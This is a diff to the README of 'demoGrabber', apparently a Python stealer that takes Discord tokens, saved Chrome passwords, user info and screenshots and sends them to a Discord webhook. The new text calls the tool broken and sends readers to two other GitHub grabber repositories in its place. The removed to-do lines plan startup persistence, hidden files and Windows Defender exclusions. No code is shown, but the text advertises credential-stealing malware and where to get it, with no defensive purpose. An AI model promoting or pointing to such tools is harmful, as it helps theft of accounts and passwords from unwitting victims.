@@ -1,7 +1,14 @@
 # demoGrabber
 Discord Token and Chrome Password Grabber working through Discord Webhook
 
-Working. 
+really shitcoded, not working really well since using PyCrypto
+until fixed pls use 
+
+https://github.com/ItsChasa/Grabber 
+
+or
+
+https://github.com/ETH44N/saved-password-grabber
 
 # Functions
 - Sends Passwords aswell as Token and User Info to Webhook
@@ -9,8 +16,7 @@ Working.
 - Sends Screenshot
 
 # To-Do
-- add to startup and hide files
-- add startup folders to windows defender exclusion
+fix
 
 # INFO
 
